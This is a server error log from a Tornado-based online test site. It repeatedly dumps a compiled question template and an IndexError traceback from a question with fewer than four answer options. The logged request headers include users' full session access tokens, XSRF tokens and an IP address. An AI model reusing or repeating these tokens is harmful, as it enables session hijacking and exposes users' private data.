 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5059fbd68e4c854816f4873c&answers=%5B2%5D&cursor=11&_xsrf=33b2d3e110e74840bbd7358e87564a72', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '93', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '109.158.140.86', 'Cookie': '_xsrf=33b2d3e110e74840bbd7358e87564a72; access_token=QUFBRzZsTmNzNkdjQkFCR1haQU1zTjdScmxHU0liSWkxSTZsWkJJUThaQkJOVE1NRXRuejBscm5aQkRsT05NaHJ2UG42QlpBWkJSNWFUTWtTS2I4dUVxQjFUTVhvMkRkS1EwTnRZWkFmeXdRTVFaRFpE|1348074430|5a5230fb3bbcf0ad46d398116597e2bc36440484; __utma=188782963.2143483449.1347970376.1347975978.1348074412.3; __utmb=188782963.5.10.1348074412; __utmc=188782963; __utmz=188782963.1347970376.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 146.77ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5059fbd68e4c854816f4873c&answers=%5B0%5D&cursor=13&_xsrf=33b2d3e110e74840bbd7358e87564a72', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '93', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '109.158.140.86', 'Cookie': '_xsrf=33b2d3e110e74840bbd7358e87564a72; access_token=QUFBRzZsTmNzNkdjQkFCR1haQU1zTjdScmxHU0liSWkxSTZsWkJJUThaQkJOVE1NRXRuejBscm5aQkRsT05NaHJ2UG42QlpBWkJSNWFUTWtTS2I4dUVxQjFUTVhvMkRkS1EwTnRZWkFmeXdRTVFaRFpE|1348074430|5a5230fb3bbcf0ad46d398116597e2bc36440484; __utma=188782963.2143483449.1347970376.1347975978.1348074412.3; __utmb=188782963.5.10.1348074412; __utmc=188782963; __utmz=188782963.1347970376.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 159.86ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5059fb8d8e4c8548017fb427&answers=%5B0%2C3%5D&cursor=16&_xsrf=f0271f0340514537ba04afbeb75a2657', headers={'Referer': 'http://www.intheory.co.uk/test/new', 'Content-Length': '97', 'Accept-Language': 'en-gb,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:15.0) Gecko/20100101 Firefox/15.0.1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'X-Real-Ip': '109.158.140.86', 'Cookie': '_xsrf=f0271f0340514537ba04afbeb75a2657; __utma=188782963.121495992.1348074336.1348074336.1348074336.1; __utmb=188782963.5.10.1348074336; __utmc=188782963; __utmz=188782963.1348074336.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); access_token="QUFBRzZsTmNzNkdjQkFMYkZ2ZTZhN05BdnJaQVhpWDl2UmFXbWUwVllnWU1tWFh1TjA2N3JNMnNrQ243VEpLUzUxdEVGcU5aQ3dsSkFpaHVONkxBdXByakZ5dWd6cU15WkEzNTF2OXVKUVpEWkQ=|1348074355|dcece250862eac2015e0366c688d9203f2df8be3"', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 111.05ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
